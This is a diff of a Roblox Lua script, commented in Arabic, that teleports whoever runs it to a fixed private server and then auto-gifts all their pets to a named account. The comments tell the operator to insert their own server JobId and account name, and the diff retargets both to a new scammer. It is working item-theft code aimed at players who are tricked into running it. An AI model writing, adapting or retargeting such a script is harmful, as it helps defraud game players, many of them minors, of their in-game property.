@@ -1,6 +1,6 @@
 -- رقم سيرفرك الخاص
 local placeId = 1234567890 -- عدله إلى GameId أو PlaceId الخاص فيك
-local serverJobId = "abcdefg-hijk-lmnop-qrst-uvwxyz123456" -- JobId الخاص بسيرفرك
+local serverJobId = "98a3ccbc-78f9-4bbf-a4a1-13c45dd7d50a" -- JobId الخاص بسيرفرك
 
 -- الخطوة الأولى: نقل اللاعب إلى سيرفرك الخاص
 game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, serverJobId, game.Players.LocalPlayer)
@@ -22,5 +22,5 @@ end
 
 -- تأخير بسيط عشان يتأكد من تحميل السيرفر
 task.delay(5, function()
-    autoGiftAllPets("NoMercy034") -- غيرها إلى اسم حسابك
+    autoGiftAllPets("GLO_ALOBE7") -- غيرها إلى اسم حسابك
 end)
